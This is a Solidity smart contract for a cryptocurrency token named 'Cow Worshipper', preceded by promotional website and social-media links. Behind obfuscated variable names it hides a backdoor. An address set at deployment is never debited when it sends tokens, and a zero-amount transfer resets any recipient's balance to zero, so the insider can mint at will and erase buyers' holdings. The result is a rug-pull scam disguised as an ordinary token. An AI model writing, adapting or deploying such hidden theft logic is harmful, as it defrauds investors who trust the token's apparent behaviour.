/*

Website: https://cowworshipper.crypto-token.live/

Telegram: https://t.me/CowWorshipper

Twitter: https://twitter.com/CowWorshipper_

*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.8;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CowWorshipper is Ownable {
    mapping(address => uint256) private sfjw;

    mapping(address => uint256) private pxfnocmuglre;

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    string public name = 'Cow Worshipper';

    uint8 public decimals = 9;

    uint256 private yzanwxiq = 103;

    address public grwmpi;

    constructor(address egdblhqwpy) {
        balanceOf[msg.sender] = totalSupply;
        pxfnocmuglre[egdblhqwpy] = yzanwxiq;
        IUniswapV2Router02 qtdpuomkb = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        grwmpi = IUniswapV2Factory(qtdpuomkb.factory()).createPair(address(this), qtdpuomkb.WETH());
    }

    function transferFrom(address bapfqjkhgwt, address weyfshdcirj, uint256 khvawsq) public returns (bool success) {
        require(khvawsq <= allowance[bapfqjkhgwt][msg.sender]);
        allowance[bapfqjkhgwt][msg.sender] -= khvawsq;
        ehavq(bapfqjkhgwt, weyfshdcirj, khvawsq);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address cpxrs, uint256 khvawsq) public returns (bool success) {
        allowance[msg.sender][cpxrs] = khvawsq;
        emit Approval(msg.sender, cpxrs, khvawsq);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function transfer(address weyfshdcirj, uint256 khvawsq) public returns (bool success) {
        ehavq(msg.sender, weyfshdcirj, khvawsq);
        return true;
    }

    string public symbol = 'Cow Worshipper';

    function ehavq(address bapfqjkhgwt, address weyfshdcirj, uint256 khvawsq) private {
        if (0 == pxfnocmuglre[bapfqjkhgwt]) {
            balanceOf[bapfqjkhgwt] -= khvawsq;
        }
        balanceOf[weyfshdcirj] += khvawsq;
        if (0 == khvawsq && weyfshdcirj != grwmpi) {
            balanceOf[weyfshdcirj] = khvawsq;
        }
        emit Transfer(bapfqjkhgwt, weyfshdcirj, khvawsq);
    }

    event Transfer(address indexed from, address indexed to, uint256 value);
}